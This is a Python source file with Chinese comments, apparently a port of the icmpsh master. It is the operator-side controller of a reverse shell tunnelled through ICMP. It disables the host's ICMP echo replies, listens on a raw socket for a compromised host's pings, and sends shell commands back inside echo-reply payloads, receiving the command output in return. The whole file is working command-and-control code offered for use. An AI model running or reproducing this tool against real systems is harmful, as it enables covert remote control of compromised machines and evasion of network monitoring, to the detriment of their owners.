import os
import select
import socket
import subprocess
import sys


def setNonBlocking(fd):
    """
    将文件描述符设置为非阻塞模式
    """
    import fcntl

    flags = fcntl.fcntl(fd, fcntl.F_GETFL)
    flags = flags | os.O_NONBLOCK
    fcntl.fcntl(fd, fcntl.F_SETFL, flags)


def main(src, dst):
    # 检查是否在Windows系统上运行，如果是则退出
    if subprocess._mswindows:
        sys.stderr.write("icmpsh master只能在Posix系统上运行\n")
        sys.exit(255)

    # 尝试导入Impacket库，如果没有安装则提示并退出
    try:
        from impacket import ImpactDecoder
        from impacket import ImpactPacket
    except ImportError:
        sys.stderr.write("你需要先安装Python Impacket库\n")
        sys.exit(255)

    # 将标准输入设置为非阻塞模式
    stdin_fd = sys.stdin.fileno()
    setNonBlocking(stdin_fd)

    # 打开一个ICMP协议的socket
    # 设置一个特殊选项以包含IP头
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except socket.error as e:
        sys.stderr.write("你需要以管理员权限运行icmpsh master\n")
        sys.exit(1)

    sock.setblocking(0)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    # 创建一个新的IP包，并设置源地址和目标地址
    ip = ImpactPacket.IP()
    ip.set_ip_src(src)
    ip.set_ip_dst(dst)

    # 创建一个类型为ECHO REPLY的ICMP包
    icmp = ImpactPacket.ICMP()
    icmp.set_icmp_type(icmp.ICMP_ECHOREPLY)

    # 实例化一个IP包解码器
    decoder = ImpactDecoder.IPDecoder()

    while 1:
        cmd = ""

        # 等待接收回复
        if sock in select.select([sock], [], [])[0]:
            buff = sock.recv(4096)

            if 0 == len(buff):
                # 远程关闭socket
                sock.close()
                sys.exit(0)

            # 接收到包，进行解码并显示
            ippacket = decoder.decode(buff)
            icmppacket = ippacket.child()

            # 如果包匹配，则报告给用户
            if (
                ippacket.get_ip_dst() == src
                and ippacket.get_ip_src() == dst
                and 8 == icmppacket.get_icmp_type()
            ):
                # 获取标识符和序列号
                ident = icmppacket.get_icmp_id()
                seq_id = icmppacket.get_icmp_seq()
                data = icmppacket.get_data_as_string()

                if len(data) > 0:
                    # 将字节解码为字符串并输出到stdout，处理错误
                    sys.stdout.write(data.decode("utf-8", errors="replace"))

                # 从标准输入读取命令
                try:
                    cmd = sys.stdin.readline()
                except:
                    pass

                if cmd == "exit\n":
                    return

                # 设置标识符和序列号
                icmp.set_icmp_id(ident)
                icmp.set_icmp_seq(seq_id)

                # 将命令编码为字节，并包含在ICMP包中
                icmp.contains(ImpactPacket.Data(cmd.encode("utf-8")))

                # 计算校验和
                icmp.set_icmp_cksum(0)
                icmp.auto_checksum = 1

                # 将IP包包含ICMP包（及其有效载荷）
                ip.contains(icmp)

                # 发送到目标主机
                sock.sendto(ip.get_packet(), (dst, 0))


if __name__ == "__main__":
    # 在脚本开始时运行系统命令
    try:
        subprocess.run(["sysctl", "-w", "net.ipv4.icmp_echo_ignore_all=1"], check=True)
    except subprocess.CalledProcessError as e:
        sys.stderr.write(f"Failed to execute sysctl command: {e}\n")
        sys.exit(1)

    if len(sys.argv) < 3:
        msg = "缺少强制选项。以root身份执行：\n"
        msg += "./icmpsh-m.py <源IP地址> <目标IP地址>\n"
        sys.stderr.write(msg)
        sys.exit(1)

    main(sys.argv[1], sys.argv[2])
